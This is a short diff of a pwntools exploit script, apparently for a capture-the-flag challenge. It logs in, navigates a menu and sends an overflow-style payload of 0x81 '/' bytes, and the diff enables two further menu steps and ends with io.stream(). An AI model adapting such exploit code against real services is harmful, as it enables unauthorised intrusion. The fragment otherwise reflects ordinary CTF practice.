@@ -59,8 +59,8 @@ io.sendlineafter(b":", b"user")
 io.sendlineafter(b":", b"password")
 io.sendlineafter(b">", b"2")
 io.sendlineafter(b">", bytes([0x2f]) * 0x81)
-# io.sendlineafter(b">", b"3")
-# io.sendlineafter(b">", b"4")
+io.sendlineafter(b">", b"3")
+io.sendlineafter(b">", b"4")
 
-io.interactive()
+io.stream()
 
